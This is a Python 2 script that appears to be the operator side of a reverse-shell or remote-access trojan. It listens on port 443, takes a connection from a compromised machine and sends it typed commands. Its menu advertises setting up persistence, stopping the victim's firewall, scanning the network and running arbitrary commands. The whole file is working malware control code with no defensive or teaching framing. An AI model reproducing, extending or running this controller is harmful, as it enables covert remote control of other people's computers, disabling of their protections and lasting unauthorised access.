# -*- coding: utf-8 -*-
import socket 
import os

def server():
    try:
        os.system('cls')
    except:
        os.system('clear')
        
    s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 443))
    s.listen(2)
    print "Socket created..."
    print "Listening on port 443... "
    (client, (ip, port)) = s.accept()
    print " Received connection from : ", ip
     

    print 'Commands:\nos info\t\tType "os info" to get information about the system\npersistence \tType "persistence" to try and create the persistence \nfirewall \tType "firewall" to try and stop the firewall \nscanner \tType "scanner" to scan the network\nhelp/-?/-h \tType "help" to display (this) help \nquit \t\tType "quit" to exit the program and close the connection.\n'
    print 'You can also execute any command that you want.\nBe careful to run an appropriate command according to the operating system.'

     
    while True:
        command = raw_input('~$ ')
        client.send(command)
        data=client.recv(2048)
        print data
        if command == 'quit':
            break
        if command == 'help':
            print 'Commands:\nos info\t Type "os info" to get information about the system\npersistence \tType "persistence" to try and create the persistence \nfirewall \tType "firewall" to try and stop the firewall \nscanner \tType "scanner" to scan the network\nhelp/-?/-h \tType "help" to display (this) help \nquit \t \nType "quit" to exit the program and close the connection.\n'
            print 'You can also execute any command that you want.\n Be careful to run an appropriate command according to the operating system.'

    client.close()
    s.close()
    
server()
